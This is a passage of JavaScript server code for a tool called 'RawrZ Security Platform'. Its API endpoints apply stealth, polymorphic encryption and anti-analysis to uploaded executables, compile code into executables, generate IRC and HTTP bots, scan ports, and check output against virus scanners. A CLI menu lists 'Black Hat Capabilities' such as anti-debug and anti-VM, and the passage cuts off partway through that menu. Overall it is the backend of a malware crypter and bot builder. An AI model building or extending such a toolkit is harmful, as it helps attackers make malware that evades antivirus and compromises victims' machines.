            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const { 
                    stealthLevel = 'maximum',
                    evasionTechniques = ['polymorphic', 'metamorphic', 'obfuscation'],
                    targetOS = 'windows',
                    antiAnalysis = true
                } = req.body;
                
                // Convert checkbox values to boolean (handle both string and boolean)
                const parseCheckbox = (value) => {
                    if (typeof value === 'boolean') return value;
                    if (typeof value === 'string') {
                        return value === 'true' || value === 'on' || value === '1';
                    }
                    return true; // default to true for stealth features
                };
                
                // Parse evasion techniques from checkboxes
                let parsedEvasionTechniques = evasionTechniques;
                if (typeof evasionTechniques === 'string') {
                    parsedEvasionTechniques = evasionTechniques.split(',').map(t => t.trim());
                }
                
                const result = await realEncryptionEngine.generateBeaconismStealth(req.file.buffer, {
                    stealthLevel,
                    evasionTechniques: parsedEvasionTechniques,
                    targetOS,
                    antiAnalysis: parseCheckbox(antiAnalysis)
                });
                
                // Save stealth file to processed directory
                const stealthFilename = `${req.file.originalname}_beaconism-stealth_${Date.now()}.stealth`;
                const stealthPath = path.join(processedDir, stealthFilename);
                await fs.writeFile(stealthPath, result.stealthData);
                
                res.json({
                    success: true,
                    data: {
                        filename: stealthFilename,
                        metadata: result.metadata,
                        beaconism: result.beaconism,
                        originalSize: result.originalSize,
                        stealthSize: result.stealthSize,
                        downloadUrl: `/api/files/download-processed/${stealthFilename}`,
                        message: 'Beaconism stealth generation completed successfully'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Polymorphic encryption endpoint
app.post('/api/real-encryption/polymorphic-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                if (!req.file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                const { variants = 3, algorithmRotation = true } = req.body;
                
                // Convert checkbox values to boolean (handle both string and boolean)
                const parseCheckbox = (value) => {
                    if (typeof value === 'boolean') return value;
                    if (typeof value === 'string') {
                        return value === 'true' || value === 'on' || value === '1';
                    }
                    return true; // default to true for polymorphic features
                };
                
                const result = await realEncryptionEngine.generatePolymorphicEncryption(req.file.buffer, {
                    variants: parseInt(variants) || 3,
                    algorithmRotation: parseCheckbox(algorithmRotation)
                });
                
                // Save polymorphic file to processed directory
                const polymorphicFilename = `${req.file.originalname}_polymorphic-encrypted_${Date.now()}.enc`;
                const polymorphicPath = path.join(processedDir, polymorphicFilename);
                await fs.writeFile(polymorphicPath, result.encrypted);
                
                res.json({
                    success: true,
                    data: {
                        filename: polymorphicFilename,
                        selectedVariant: result.selectedVariant,
                        algorithm: result.algorithm,
                        variants: result.variants.length,
                        originalSize: req.file.buffer.length,
                        encryptedSize: result.encrypted.length,
                        downloadUrl: `/api/files/download-processed/${polymorphicFilename}`,
                        message: 'Polymorphic encryption completed successfully'
                    },
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Delete file
app.delete('/api/files/delete/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        await fs.unlink(filePath);
        
        res.json({
            success: true,
            message: `File ${filename} deleted successfully`,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Convert Encrypted File to EXE using Roslyn
app.post('/api/real-encryption/convert-enc-to-exe', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to C# code that recreates the original file
        const csharpCode = realEncryptionEngine.generateCSharpFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `reconstructed_${Date.now()}.exe`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile C# code to EXE using Roslyn
        const compileResult = await realEncryptionEngine.realRoslynCompilation(csharpCode, outputFilePath);
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to EXE error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to executable.', details: error.message });
    }
});

// Direct Roslyn Compilation Endpoint
app.post('/api/real-encryption/roslyn-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { csharpCode, targetFramework = 'net6.0', configuration = 'Release' } = req.body;
        
        if (!csharpCode) {
            return res.status(400).json({ success: false, error: 'C# code is required.' });
        }

        const outputFilename = `roslyn_compiled_${Date.now()}.exe`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realRoslynCompilation(csharpCode, outputFilePath, { targetFramework, configuration });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `C# code compiled to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                targetFramework,
                configuration,
                compilationResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Roslyn compilation error:', error);
        res.status(500).json({ success: false, error: 'Roslyn compilation failed.', details: error.message });
    }
});

// Convert Encrypted File to Native C++ EXE
app.post('/api/real-encryption/convert-enc-to-native-cpp', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv, compiler = 'gcc', optimization = '-O2' } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to C++ code that recreates the original file
        const cppCode = realEncryptionEngine.generateCppFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `native_cpp_reconstructed_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile C++ code to native executable
        const compileResult = await realEncryptionEngine.realNativeCppCompilation(cppCode, outputFilePath, { 
            compiler, 
            optimization,
            architecture: 'x64',
            targetOS: 'linux',
            staticLinking: true
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to native C++ executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to Native C++ error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to native C++ executable.', details: error.message });
    }
});

// Direct Native C++ Compilation Endpoint
app.post('/api/real-encryption/native-cpp-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { cppCode, compiler = 'gcc', optimization = '-O2', architecture = 'x64', targetOS = 'linux' } = req.body;
        
        if (!cppCode) {
            return res.status(400).json({ success: false, error: 'C++ code is required.' });
        }

        const outputFilename = `native_cpp_compiled_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realNativeCppCompilation(cppCode, outputFilePath, { 
            compiler, 
            optimization, 
            architecture, 
            targetOS,
            staticLinking: true
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `C++ code compiled to native executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                compiler,
                optimization,
                architecture,
                targetOS,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Native C++ compilation error:', error);
        res.status(500).json({ success: false, error: 'Native C++ compilation failed.', details: error.message });
    }
});

// Convert Encrypted File to Java EXE
app.post('/api/real-encryption/convert-enc-to-java', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv, targetVersion = '11', optimization = 'release' } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to Java code that recreates the original file
        const javaCode = realEncryptionEngine.generateJavaFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `java_reconstructed_${Date.now()}.jar`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile Java code to executable
        const compileResult = await realEncryptionEngine.realJavaCompilation(javaCode, outputFilePath, { 
            targetVersion, 
            optimization
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to Java executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to Java error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to Java executable.', details: error.message });
    }
});

// Convert Encrypted File to Python EXE
app.post('/api/real-encryption/convert-enc-to-python', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv, usePyInstaller = true, oneFile = true } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to Python code that recreates the original file
        const pythonCode = realEncryptionEngine.generatePythonFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `python_reconstructed_${Date.now()}.exe`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile Python code to executable
        const compileResult = await realEncryptionEngine.realPythonCompilation(pythonCode, outputFilePath, { 
            usePyInstaller, 
            oneFile
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to Python executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to Python error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to Python executable.', details: error.message });
    }
});

// Convert Encrypted File to Rust EXE
app.post('/api/real-encryption/convert-enc-to-rust', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv, optimization = 'release', target = 'x86_64-unknown-linux-gnu' } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to Rust code that recreates the original file
        const rustCode = realEncryptionEngine.generateRustFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `rust_reconstructed_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile Rust code to executable
        const compileResult = await realEncryptionEngine.realRustCompilation(rustCode, outputFilePath, { 
            optimization, 
            target
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to Rust executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to Rust error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to Rust executable.', details: error.message });
    }
});

// Convert Encrypted File to Go EXE
app.post('/api/real-encryption/convert-enc-to-go', async (req, res) => {
    try {
        await initializeEngine();
        
        const { encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv, optimization = 'release', targetOS = 'linux', targetArch = 'amd64' } = req.body;
        
        if (!encryptedFilename || !aesKey || !camelliaKey || !aesIv || !camelliaIv) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required parameters: encryptedFilename, aesKey, camelliaKey, aesIv, camelliaIv' 
            });
        }

        // Check if encrypted file exists in processed directory
        const encryptedFilePath = path.join(processedDir, encryptedFilename);
        try {
            await fs.access(encryptedFilePath);
        } catch (e) {
            return res.status(404).json({ success: false, error: 'Encrypted file not found.' });
        }

        // Convert hex strings back to buffers
        const keys = {
            aes: Buffer.from(aesKey, 'hex'),
            camellia: Buffer.from(camelliaKey, 'hex')
        };
        const ivs = {
            aes: Buffer.from(aesIv, 'hex'),
            camellia: Buffer.from(camelliaIv, 'hex')
        };

        // Read encrypted file
        const encryptedData = await fs.readFile(encryptedFilePath);
        
        // Decrypt the file (reverse of dual encryption)
        const decryptedResult = await realEncryptionEngine.realDualDecryption(encryptedData, keys, ivs);
        
        // Convert decrypted data to Go code that recreates the original file
        const goCode = realEncryptionEngine.generateGoFromBinary(decryptedResult.decrypted);
        
        // Generate output filename
        const outputFilename = `go_reconstructed_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);
        
        // Compile Go code to executable
        const compileResult = await realEncryptionEngine.realGoCompilation(goCode, outputFilePath, { 
            optimization, 
            targetOS, 
            targetArch
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Encrypted file converted to Go executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                originalEncryptedFile: encryptedFilename,
                outputExecutable: outputFilename,
                outputSize: stats.size,
                decryptedSize: decryptedResult.decryptedSize,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Convert ENC to Go error:', error);
        res.status(500).json({ success: false, error: 'Failed to convert encrypted file to Go executable.', details: error.message });
    }
});

// Direct Java Compilation Endpoint
app.post('/api/real-encryption/java-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { javaCode, targetVersion = '11', optimization = 'release', outputFormat = 'jar' } = req.body;
        
        if (!javaCode) {
            return res.status(400).json({ success: false, error: 'Java code is required.' });
        }

        const outputFilename = `java_compiled_${Date.now()}.${outputFormat}`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realJavaCompilation(javaCode, outputFilePath, { 
            targetVersion, 
            optimization
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Java code compiled to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                targetVersion,
                optimization,
                outputFormat,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Java compilation error:', error);
        res.status(500).json({ success: false, error: 'Java compilation failed.', details: error.message });
    }
});

// Direct Python Compilation Endpoint
app.post('/api/real-encryption/python-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { pythonCode, usePyInstaller = true, oneFile = true } = req.body;
        
        if (!pythonCode) {
            return res.status(400).json({ success: false, error: 'Python code is required.' });
        }

        const outputFilename = `python_compiled_${Date.now()}.exe`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realPythonCompilation(pythonCode, outputFilePath, { 
            usePyInstaller, 
            oneFile
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Python code compiled to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                usePyInstaller,
                oneFile,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Python compilation error:', error);
        res.status(500).json({ success: false, error: 'Python compilation failed.', details: error.message });
    }
});

// Direct Rust Compilation Endpoint
app.post('/api/real-encryption/rust-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { rustCode, optimization = 'release', target = 'x86_64-unknown-linux-gnu' } = req.body;
        
        if (!rustCode) {
            return res.status(400).json({ success: false, error: 'Rust code is required.' });
        }

        const outputFilename = `rust_compiled_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realRustCompilation(rustCode, outputFilePath, { 
            optimization, 
            target
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Rust code compiled to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                optimization,
                target,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Rust compilation error:', error);
        res.status(500).json({ success: false, error: 'Rust compilation failed.', details: error.message });
    }
});

// Direct Go Compilation Endpoint
app.post('/api/real-encryption/go-compile', async (req, res) => {
    try {
        await initializeEngine();
        
        const { goCode, optimization = 'release', targetOS = 'linux', targetArch = 'amd64' } = req.body;
        
        if (!goCode) {
            return res.status(400).json({ success: false, error: 'Go code is required.' });
        }

        const outputFilename = `go_compiled_${Date.now()}`;
        const outputFilePath = path.join(processedDir, outputFilename);

        const compileResult = await realEncryptionEngine.realGoCompilation(goCode, outputFilePath, { 
            optimization, 
            targetOS, 
            targetArch
        });
        const stats = await fs.stat(outputFilePath);

        res.json({
            success: true,
            message: `Go code compiled to executable. Download at /api/files/download-processed/${outputFilename}`,
            data: {
                filename: outputFilename,
                outputSize: stats.size,
                optimization,
                targetOS,
                targetArch,
                compilationResult: compileResult
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Go compilation error:', error);
        res.status(500).json({ success: false, error: 'Go compilation failed.', details: error.message });
    }
});

// ===== ALL ENGINE ENDPOINTS =====

// Engine Status Endpoint
app.get('/api/engines/status', async (req, res) => {
    try {
        const engineStatus = {};
        for (const [name, engine] of engines) {
            if (engine) {
                if (engine.getStatus) {
                    engineStatus[name] = engine.getStatus();
                } else {
                    engineStatus[name] = { name, loaded: true, initialized: true };
                }
            } else {
                engineStatus[name] = { name, loaded: false, error: 'Failed to load' };
            }
        }
        
        res.json({
            success: true,
            totalEngines: engines.size,
            loadedEngines: Array.from(engines.values()).filter(e => e !== null).length,
            engines: engineStatus,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to get engine status', details: error.message });
    }
});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot/generate', async (req, res) => {
    try {
        const ircBotGenerator = engines.get('irc-bot-generator');
        if (!ircBotGenerator) {
            return res.status(500).json({ success: false, error: 'IRC Bot Generator not available' });
        }
        
        const { config, features, extensions } = req.body;
        const result = await ircBotGenerator.generateBot(config, features, extensions);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'IRC Bot generation failed', details: error.message });
    }
});

// Advanced Crypto Endpoints
app.post('/api/advanced-crypto/encrypt', async (req, res) => {
    try {
        const advancedCrypto = engines.get('advanced-crypto');
        if (!advancedCrypto) {
            return res.status(500).json({ success: false, error: 'Advanced Crypto not available' });
        }
        
        const { data, algorithm, key } = req.body;
        const result = await advancedCrypto.encrypt(data, algorithm, key);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Advanced encryption failed', details: error.message });
    }
});

// Stealth Engine Endpoints
app.post('/api/stealth/apply', async (req, res) => {
    try {
        const stealthEngine = engines.get('stealth-engine');
        if (!stealthEngine) {
            return res.status(500).json({ success: false, error: 'Stealth Engine not available' });
        }
        
        const { data, techniques } = req.body;
        const result = await stealthEngine.applyStealth(data, techniques);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Stealth application failed', details: error.message });
    }
});

// Polymorphic Engine Endpoints
app.post('/api/polymorphic/generate', async (req, res) => {
    try {
        const polymorphicEngine = engines.get('polymorphic-engine');
        if (!polymorphicEngine) {
            return res.status(500).json({ success: false, error: 'Polymorphic Engine not available' });
        }
        
        const { data, variants } = req.body;
        const result = await polymorphicEngine.generateVariants(data, variants);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Polymorphic generation failed', details: error.message });
    }
});

// Anti-Analysis Engine Endpoints
app.post('/api/anti-analysis/apply', async (req, res) => {
    try {
        const antiAnalysis = engines.get('anti-analysis');
        if (!antiAnalysis) {
            return res.status(500).json({ success: false, error: 'Anti-Analysis Engine not available' });
        }
        
        const { data, techniques } = req.body;
        const result = await antiAnalysis.applyAntiAnalysis(data, techniques);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Anti-analysis application failed', details: error.message });
    }
});

// Virus Scanner Endpoints
app.post('/api/virus-scanner/scan', async (req, res) => {
    try {
        const virusScanner = engines.get('private-virus-scanner');
        if (!virusScanner) {
            return res.status(500).json({ success: false, error: 'Virus Scanner not available' });
        }
        
        const { filePath, engines: scanEngines } = req.body;
        const result = await virusScanner.scanFile(filePath, scanEngines);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Virus scan failed', details: error.message });
    }
});

// Jotti Scanner Endpoints
app.post('/api/jotti/scan', async (req, res) => {
    try {
        const jottiScanner = engines.get('jotti-scanner');
        if (!jottiScanner) {
            return res.status(500).json({ success: false, error: 'Jotti Scanner not available' });
        }
        
        const { filePath } = req.body;
        const result = await jottiScanner.scanFile(filePath);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Jotti scan failed', details: error.message });
    }
});

// HTTP Bot Generator Endpoints
app.post('/api/http-bot/generate', async (req, res) => {
    try {
        const httpBotGenerator = engines.get('http-bot-generator');
        if (!httpBotGenerator) {
            return res.status(500).json({ success: false, error: 'HTTP Bot Generator not available' });
        }
        
        const { config, features } = req.body;
        const result = await httpBotGenerator.generateBot(config, features);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'HTTP Bot generation failed', details: error.message });
    }
});

// Memory Manager Endpoints
app.post('/api/memory/allocate', async (req, res) => {
    try {
        const memoryManager = engines.get('memory-manager');
        if (!memoryManager) {
            return res.status(500).json({ success: false, error: 'Memory Manager not available' });
        }
        
        const { size, type } = req.body;
        const result = await memoryManager.allocateMemory(size, type);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Memory allocation failed', details: error.message });
    }
});

// Network Tools Endpoints
app.post('/api/network/scan', async (req, res) => {
    try {
        const networkTools = engines.get('network-tools');
        if (!networkTools) {
            return res.status(500).json({ success: false, error: 'Network Tools not available' });
        }
        
        const { target, ports } = req.body;
        const result = await networkTools.scanPorts(target, ports);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Network scan failed', details: error.message });
    }
});

// Performance Optimizer Endpoints
app.post('/api/performance/optimize', async (req, res) => {
    try {
        const performanceOptimizer = engines.get('performance-optimizer');
        if (!performanceOptimizer) {
            return res.status(500).json({ success: false, error: 'Performance Optimizer not available' });
        }
        
        const { data, options } = req.body;
        const result = await performanceOptimizer.optimize(data, options);
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Performance optimization failed', details: error.message });
    }
});

// Health Monitor Endpoints
app.get('/api/health/detailed', async (req, res) => {
    try {
        const healthMonitor = engines.get('health-monitor');
        if (!healthMonitor) {
            return res.status(500).json({ success: false, error: 'Health Monitor not available' });
        }
        
        const result = await healthMonitor.getDetailedHealth();
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Health check failed', details: error.message });
    }
});

// CLI Interface
const readline = require('readline');

function createCLI() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: 'RawrZ> '
    });

    rl.on('line', async (input) => {
        const command = input.trim().toLowerCase();
        
        switch (command) {
            case 'help':
            case '?':
                console.log(`
RawrZ Security Platform - CLI Commands:
  help, ?          - Show this help message
  status           - Show server status
  engines          - Show all engine status
  endpoints        - List available API endpoints
  test             - Test compilation endpoints
  irc-bot          - Generate IRC bot
  stealth          - Apply stealth techniques
  polymorphic      - Generate polymorphic variants
  anti-analysis    - Apply anti-analysis techniques
  virus-scan       - Scan file with virus scanner
  jotti-scan       - Scan file with Jotti
  network-scan     - Network port scan
  memory-alloc     - Allocate memory
  performance      - Performance optimization
  health           - Detailed health check
  
Black Hat Capabilities:
  anti-debug       - Apply anti-debugging techniques
  anti-vm          - Apply anti-VM techniques
